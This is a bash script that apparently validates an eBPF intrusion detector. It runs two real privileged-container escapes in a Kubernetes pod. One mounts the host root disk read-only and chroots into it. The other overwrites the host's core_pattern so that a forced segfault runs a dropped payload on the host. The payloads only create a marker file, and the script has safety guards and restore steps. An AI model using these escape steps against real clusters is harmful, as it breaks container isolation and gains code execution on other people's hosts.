#!/bin/bash
# =============================================================================
# attack_cve.sh -- REAL container-escape techniques (C1, C2) for B1.
# -----------------------------------------------------------------------------
# Unlike attack_escape.sh's benign STAND-INS (E4/E5), these perform GENUINE
# privileged-container escapes that detonate on this exact host
# (kernel 6.8, cgroup v2, modern k3s runc -- where the classic NUMBERED CVEs
# like CVE-2022-0492 / CVE-2019-5736 are patched and will not fire).
#
# They are chosen to validate DISTINCT detection primitives with a real exploit
# path (not a self-written signature):
#   C1  privileged host-disk mount + chroot   -> privileged-mount + file-boundary
#   C2  core_pattern host code-exec           -> file-boundary (host exec write)
#
# SAFETY (see experiments/CVE_SAFETY.md -- READ IT FIRST):
#   * Payloads are NON-DESTRUCTIVE: they only read a host file / touch a marker.
#     They NEVER read or transmit host credentials (host credential files etc.).
#   * C1 mounts the host disk READ-ONLY (-o ro) -> cannot corrupt the host fs.
#   * C2 BACKS UP and RESTORES /proc/sys/kernel/core_pattern (host crash handler);
#     restoration runs via an EXIT trap even if the script is interrupted.
#   * Hard guard: refuses to run unless CONFIRM_DETONATE=yes (no accidental fire).
#   * Take a VM snapshot before running. Run AFTER the consolidated rerun frees
#     the cluster, with the eBPF agent already capturing alerts.
#
# *** Ensure the eBPF agent is running in another terminal first. ***
# =============================================================================
set -uo pipefail

# ---- Detonation guard -------------------------------------------------------
if [ "${CONFIRM_DETONATE:-no}" != "yes" ]; then
    echo "REFUSING TO RUN: this script performs REAL container escapes." >&2
    echo "Re-run with CONFIRM_DETONATE=yes after you have:" >&2
    echo "  1. taken a VM snapshot," >&2
    echo "  2. started the eBPF agent, and" >&2
    echo "  3. confirmed the consolidated detection rerun has finished." >&2
    exit 2
fi

POD=attacker-escape
GROUND_TRUTH="${GROUND_TRUTH:-ground_truth_cve.jsonl}"
MANIFEST="$(dirname "$0")/manifests/attacker-escape.yaml"

gt() {
    printf '{"ts": %s, "trial": %s, "scenario": "%s", "category": "%s", "expect_rule": "%s"}\n' \
        "$(date +%s.%N)" "${TRIAL:-1}" "$1" "$2" "$3" >> "$GROUND_TRUTH"
}
run() { kubectl exec $POD -- sh -c "$1"; }

echo "=== Deploying privileged attacker pod (fresh) ==="
kubectl delete -f "$MANIFEST" --ignore-not-found --wait=true >/dev/null 2>&1 || true
kubectl apply -f "$MANIFEST"
kubectl wait --for=condition=Ready pod/$POD --timeout=120s

# =============================================================================
# C1 -- Privileged host-disk mount + chroot (REAL mount-based escape)
# -----------------------------------------------------------------------------
# A privileged container locates the host root block device and mounts it
# READ-ONLY into the container, then chroots in and reads a host-only file.
# This is the canonical "privileged container == root on host" escape and
# exercises the privileged-mount rule with a real block-device mount (not the
# benign tmpfs/bind of E5).
# =============================================================================
echo ""
echo "=== C1: Privileged host-disk mount + chroot (READ-ONLY, non-destructive) ==="
gt C1 ESCAPE privileged-mount
run '
  set -e
  mkdir -p /mnt/hostdisk
  # Discover the host root block device from the host /proc (mounted at /host).
  DEV=$(awk "\$2==\"/\"{print \$1; exit}" /host/proc/mounts 2>/dev/null)
  echo "[C1] host root device = ${DEV:-<unknown>}"
  if [ -n "$DEV" ] && [ -b "$DEV" ]; then
    # READ-ONLY mount: real escape primitive, zero risk of host fs corruption.
    mount -o ro "$DEV" /mnt/hostdisk 2>&1 | head -1 || true
    echo "[C1] escaped: host /etc/hostname via mounted disk -> $(chroot /mnt/hostdisk cat /etc/hostname 2>/dev/null)"
    umount /mnt/hostdisk 2>/dev/null || true
  else
    echo "[C1] block device not directly mountable; falling back to bind escape"
    mount --bind /host /mnt/hostdisk 2>&1 | head -1 || true
    umount /mnt/hostdisk 2>/dev/null || true
  fi
' || true
sleep 1

# =============================================================================
# C2 -- core_pattern host code execution (REAL proc-write -> host exec escape)
# -----------------------------------------------------------------------------
# A privileged container writes a pipe handler to the HOST's (non-namespaced)
# /proc/sys/kernel/core_pattern, drops a payload on the host fs, then segfaults
# so the kernel executes the payload ON THE HOST. Payload only touches a marker.
# core_pattern is BACKED UP and RESTORED (trap below) -- leaving it pointed at a
# deleted payload would break future host crash handling, so restore is mandatory.
# =============================================================================
echo ""
echo "=== C2: core_pattern host code-exec (non-destructive marker payload) ==="

# Save + guarantee restore of the host crash handler even on interrupt.
ORIG_COREPATTERN="$(run 'cat /proc/sys/kernel/core_pattern' 2>/dev/null || echo 'core')"
restore_corepattern() {
    echo "[C2] restoring host core_pattern -> '$ORIG_COREPATTERN'"
    run "printf '%s\n' '$ORIG_COREPATTERN' > /proc/sys/kernel/core_pattern" 2>/dev/null || true
    run 'rm -f /host/tmp/cve_payload.sh /host/tmp/cve_corepattern_pwned' 2>/dev/null || true
}
trap restore_corepattern EXIT

gt C2 ESCAPE file-boundary
run '
  set -e
  # 1. Drop a NON-DESTRUCTIVE payload on the host fs (host /tmp == /host/tmp).
  printf "#!/bin/sh\ntouch /tmp/cve_corepattern_pwned\n" > /host/tmp/cve_payload.sh
  chmod +x /host/tmp/cve_payload.sh
  # 2. Point the host crash handler at it (core_pattern is NOT namespaced).
  echo "|/tmp/cve_payload.sh" > /proc/sys/kernel/core_pattern
  # 3. Trigger a core dump so the kernel runs the payload ON THE HOST.
  ( ulimit -c unlimited; sh -c "kill -SEGV \$\$" ) 2>/dev/null || true
  sleep 1
  if [ -f /host/tmp/cve_corepattern_pwned ]; then
    echo "[C2] escaped: host executed payload -> /tmp/cve_corepattern_pwned created"
  else
    echo "[C2] payload not (yet) triggered; core dumping may be restricted"
  fi
' || true
sleep 1

restore_corepattern
trap - EXIT

echo ""
echo "=== Cleaning up ==="
kubectl delete -f "$MANIFEST" --wait=false
echo "CVE escape scenarios complete. Ground truth -> $GROUND_TRUTH"
echo "Score against the agent's alerts.jsonl to confirm privileged-mount (C1) + file-boundary (C2)."
